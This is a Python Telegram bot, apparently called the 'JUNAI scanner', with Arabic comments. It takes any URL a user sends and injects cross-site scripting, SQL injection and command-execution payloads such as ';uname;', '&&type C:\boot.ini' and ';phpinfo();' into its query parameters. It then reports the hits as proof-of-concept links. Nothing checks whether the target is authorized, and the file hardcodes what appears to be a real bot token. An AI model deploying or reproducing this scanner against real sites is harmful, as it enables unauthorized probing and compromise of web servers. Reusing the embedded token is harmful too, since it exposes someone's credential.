
import re
import requests
import telebot

# قائمة المالكين والمستخدمين
Owners = ['6358035274']  # استبدل هذا بمعرف المستخدم الخاص بك
NormalUsers = []

# استبدل 'YOUR_TOKEN_HERE' بالرمز الخاص بك من BotFather
bot = telebot.TeleBot('7761188365:AAGl-tdVAuMNfkgfWEgNovKHNXEqT3-Bsic')

class colors:
    def __init__(self):
        self.green = "\033[92m"
        self.blue = "\033[94m"
        self.bold = "\033[1m"
        self.yellow = "\033[93m"
        self.red = "\033[91m"
        self.end = "\033[0m"

ga = colors()

def headers_reader(url):
    response = requests.get(url)
    if response.status_code == 200:
        return "Status code: 200 OK"
    elif response.status_code == 404:
        return "Page was not found! Please check the URL."
    
    host = url.split("/")[2]
    server = response.headers.get("Server", "Unknown")
    return f"Host: {host}, WebServer: {server}"

def main_function(url, payloads, check):
    vuln = 0
    response = requests.get(url)
    if response.status_code == 999:
        return "WebKnight WAF Detected! Delaying requests."

    results = []
    for params in url.split("?")[1].split("&"):
        for payload in payloads:
            bugs = url.replace(params, params + str(payload).strip())
            request = requests.get(bugs)
            for line in request.text.splitlines():
                checker = re.findall(check, line)
                if len(checker) != 0:
                    results.append(f"[*] Payload Found: {payload}\n[*] POC: {bugs}")
                    vuln += 1
    if vuln == 0:
        return "Target is not vulnerable!"
    else:
        return f"Congratulations! You've found {vuln} bugs:\n" + "\n".join(results)

def rce_func(url):
    header_info = headers_reader(url)
    payloads = [';${@print(md5(dadevil))}', ';${@print(md5("dadevil"))}', '%253B%2524%257B%2540print%2528md5%2528%2522zigoo0%2522%2529%2529%257D%253B',
                ';uname;', '&&dir', '&&type C:\\boot.ini', ';phpinfo();', ';phpinfo']
    check = re.compile("51107ed95250b4099a0f481221d56497|Linux|eval\(\)|SERVER_ADDR|Volume.+Serial|\[boot", re.I)
    return f"{header_info}\n" + main_function(url, payloads, check)

def xss_func(url):
    payloads = ['%27%3Edadevil0%3Csvg%2Fonload%3Dconfirm%28%2Fdadevil%2F%29%3Eweb', '%78%22%78%3e%78',
                '%22%3Edadevil%3Csvg%2Fonload%3Dconfirm%28%2Fdadevil%2F%29%3Eweb', 'dadevil%3Csvg%2Fonload%3Dconfirm%28%2Fdadevil%2F%29%3Eweb']
    check = re.compile('dadevil<svg|x>x', re.I)
    return main_function(url, payloads, check)

def error_based_sqli_func(url):
    payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><", "3%22%5C%27%5C%22%29%3B%7C%5D%2A%7B%250d%250a%3C%2500%3E%25bf%2527%27"]
    check = re.compile("Incorrect syntax|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
    return main_function(url, payloads, check)

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "Welcome to the JUNAI scanner bot! Use /scan <url> to scan a URL.")

@bot.message_handler(commands=['scan'])
def scan(message):
    try:
        url = message.text.split()[1]
        results = []
        
        # Check for XSS
        xss_results = xss_func(url)
        results.append(xss_results)

        # If no XSS vulnerabilities found, check for SQL injection
        if "not vulnerable" in xss_results:
            sql_results = error_based_sqli_func(url)
            results.append(sql_results)

        # If XSS vulnerabilities found, proceed to RCE
        if "Payload Found" in xss_results:
            rce_results = rce_func(url)
            results.append(rce_results)

        bot.reply_to(message, "\n".join(results))
    except IndexError:
        bot.reply_to(message, "Usage: /scan <url>")

def main():
    # بدء البوت
    bot.polling(none_stop=True)

if __name__ == '__main__':
    main()
